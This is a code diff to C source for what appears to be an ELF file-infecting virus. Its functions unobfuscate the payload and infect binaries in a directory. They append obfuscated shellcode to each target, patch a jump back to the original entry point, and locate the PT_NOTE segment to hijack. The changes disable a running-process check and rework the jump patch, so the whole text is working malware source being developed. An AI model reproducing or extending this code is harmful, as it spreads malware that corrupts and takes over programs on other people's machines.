@@ -44,8 +44,8 @@ int   entry_point(void *magic) {
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (1);
-  if (checkProcess(procName) != 0)
-    return (1);
+  /* if (checkProcess(procName) != 0) */
+  /*   return (1); */
   /* if (preventDebug() != 0) */
   /*   return (1); */
   if (infectBins(infectDir) == -1)
@@ -68,6 +68,7 @@ int   entry_point(void *magic) {
   register int8_t r132 asm("r13") = 0;
   register int8_t r142 asm("r14") = 0;
   register int8_t r152 asm("r15") = 0;
+  asm("leave");
   asm("jmp endSC");
 }
 
@@ -560,24 +561,28 @@ static void obfuscate(char *header, size_t size) {
 
 static int  appendShellcode(struct bfile *bin) {
   size_t  size;
-  char    ins[5];
+  char    ins[9];
   size_t  address;
   struct bfile  new;
 
   size = end - start + (lambdaEnd - lambdaStart);
-  new.size = bin->size + size + 5;
+  new.size = bin->size + size + sizeof(ins);
   if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   memcpy(((void *)new.header) + bin->size, start, size);
   obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
-  address = -(0xc000000 + bin->size - bin->header->e_entry + size + 5);
+  address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 6;
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
   ins[2] = (address >> 8) & 0xff;
   ins[3] = (address >> 16) & 0xff;
   ins[4] = (address >> 24) & 0xff;
-  memcpy(((void *)new.header) + bin->size + size, ins, 5);
+  ins[5] = (address >> 32) & 0xff;
+  ins[6] = (address >> 40) & 0xff;
+  ins[7] = (address >> 48) & 0xff;
+  ins[8] = (address >> 56) & 0xff;
+  memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
@@ -590,7 +595,8 @@ static int  appendCode(struct bfile *bin) {
 
   if (appendShellcode(bin) == -1)
     return (-1);
-  size = end - start + 5;
+  // TODO 9 = sizeof(ins)
+  size = end - start + 9;
   segment = ((void *)bin->header) + bin->header->e_phoff;
   while (segment->p_type != PT_NOTE)
     segment += 1;
